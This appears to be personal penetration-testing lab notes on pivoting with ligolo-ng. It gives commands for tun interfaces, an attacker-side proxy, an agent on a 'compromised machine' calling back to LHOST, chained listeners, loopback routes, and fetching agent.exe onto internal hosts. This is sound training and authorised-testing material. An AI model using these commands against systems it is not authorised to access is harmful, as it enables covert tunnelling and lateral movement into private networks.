https://github.com/nicocha30/ligolo-ng

Starting
	use port 11601 if possible as it lets us ALSO add a loopback route
```bash
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Attacker machine
./proxy -laddr 0.0.0.0:11601 -selfcert

#Compromised machine
.\agent.exe -connect <LHOST>:11601 -ignore-cert

#In Ligolo-ng console
session  #select host
ifconfig #Notedown the internal network's subnet
start    #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo
	# optional -- loopback :) -- see Regarding Loopbacks
	sudo ip r add 240.0.0.<no.>/32 dev ligolo<no.>

```


Once all of this is done and ligolo is started, ip a will show the interface as UP
you can now perform commands from a terminal of your own to the internal subnet

Invoke-WebRequest (iwr) for file transfer works best in my experience

If we want to add more routes, add paths, add listeners but have one central agent
https://docs.ligolo.ng/sample/double/

File Transfer
```bash
# In case you cannot transfer an additional agent onto the next box, you can try the following on PROXY:

listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp

# Host a python3 http server on KALI

python3 -m http.server 80

# Then on the box that is sequestered, file transfer 

wget http://<agent1_internal_ip>:8080/agent.exe -o agent.exe

or

iwr -uri http://<agent1_internal_ip>:8080/agent.exe -Outfile agent.exe
```

https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9

Adding Listeners
```bash
# (do this from the ligolo interface)
#On PROXY

listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

#On Agent 2

./ligolo-agent --connect <ip_agent1>:11601 -ignore-cert
session

# if you want loopback here, add a new route, then start
	# see "Adding more subnet routes/interfaces"
```

Adding more subnet routes/interfaces
```bash
# Create new interface per new subnet

sudo ip tuntap add user $(whoami) mode tun ligolo<no.>
sudo ip link set ligolo<no.> up
sudo ip r add <new_subnet>/<cidr> dev ligolo<no.>

# from ligolo proxy

session <no.>
ifconfig
start --tun ligolo<no.>       #(from proxy)
```

Regarding loopbacks
	we can have a loopback for every box we want!
	just requires more listeners
```bash
# add loopback per interface
sudo ip r add 240.0.0.<no.>/32 dev ligolo<no.>

____________________________________________________
example of what this looks like

ip r
	240.0.0.1 dev ligolo scope link 
	240.0.0.2 dev ligolo2 scope link 
```
basically here, i have a loopback .1 on interface "`ligolo`" and another loopback .2 on interface "`ligolo2`". There is no limit to this...
![[Pasted image 20250608163925.png]]

Delete routes -- for mess ups :)
```bash
sudo ip r del <ip_route>/<cidr> dev ligolo<no.>
```

Show all routes
```bash
ip r
```


___
possibly remove this...

Local Port Forwarding (alternative to chisel)
	I have incorporated this step to the Starting section up above
```
# Create interface (if not already done)
	sudo ip tuntap add user $(whoami) mode tun ligolo
	sudo ip link set ligolo up

# Create tunnel
	./proxy -laddr 0.0.0.0:11601 -selfcert
	./agent --connect <LHOST>:11601 -ignore-cert

# add loopback route
	sudo ip r add 240.0.0.1/32 dev ligolo

# On ligolo proxy terminal
	session #select session
	start

```


